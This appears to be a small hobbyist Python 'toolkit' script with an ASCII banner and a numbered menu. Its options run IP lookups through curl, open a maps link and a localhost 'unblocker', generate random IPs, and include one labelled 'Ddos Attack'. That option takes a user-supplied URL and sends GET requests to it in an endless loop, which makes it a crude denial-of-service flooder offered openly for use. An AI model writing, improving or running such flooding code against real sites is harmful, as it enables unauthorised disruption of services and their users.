import subprocess
import webbrowser
import random
import requests

def generate_random_ip():
    ip_parts = [str(random.randint(0, 255)) for _ in range(4)]
    return ".".join(ip_parts)

color = "\033[34m"
banner = """



                 ███▄    █ ▓█████  ▄▄▄▄    █    ██  ██▓    ▄▄▄      
                 ██ ▀█   █ ▓█   ▀ ▓█████▄  ██  ▓██▒▓██▒   ▒████▄    
                ▓██  ▀█ ██▒▒███   ▒██▒ ▄██▓██  ▒██░▒██░   ▒██  ▀█▄  
                ▓██▒  ▐▌██▒▒▓█  ▄ ▒██░█▀  ▓▓█  ░██░▒██░   ░██▄▄▄▄██ 
                ▒██░   ▓██░░▒████▒░▓█  ▀█▓▒▒█████▓ ░██████▒▓█   ▓██▒
                ░ ▒░   ▒ ▒ ░░ ▒░ ░░▒▓███▀▒░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒▒   ▓▒█░
                ░ ░░   ░ ▒░ ░ ░  ░▒░▒   ░ ░░▒░ ░ ░ ░ ░ ▒  ░ ▒   ▒▒ ░
                   ░   ░ ░    ░    ░    ░  ░░░ ░ ░   ░ ░    ░   ▒   
                         ░    ░  ░ ░         ░         ░  ░     ░  ░
                                        ░                           



"""

print(f"{color}{banner}")

print("[1] IP info: ")
print("[2] Location / lon | lan: ")
print("[3] Unblocker")
print("[4] Random IP ")
print("[5] Ddos Attack ")
print("[6] My IP")
x = input("Option: ")

if x == "1":
    ip = "8.8.8.8"  
    command = f"curl ipinfo.io/{ip}"

    result = subprocess.run(command, shell=True, text=True, capture_output=True)

    print("Response:")
    print(result.stdout)

    if result.returncode != 0:
        print("Error:", result.stderr)

unblocker = "http://0.0.0.0:8000/"
location = "https://www.google.com.au/maps/@23.8083902,53.5412575,3z?entry=ttu&g_ep=EgoyMDI1MDcwOS4wIKXMDSoASAFQAw%3D%3D"

if x == "2":
    webbrowser.open(location)
elif x == "3":  
    webbrowser.open(unblocker)
elif x == "4":  
    random_ip = generate_random_ip()
    print("Generated random IP:", random_ip)
elif x == "5":
    target = input(" URL to Ddos: ")
    while True: 
          r = requests.get(target)

          print(r.status_code)
elif x == "6":
    command = f"curl ifconfig.me"
    responce = subprocess.run(command, shell=True, text=True, capture_output=True)
    print("Your IP is: ")
    print(responce.stdout)
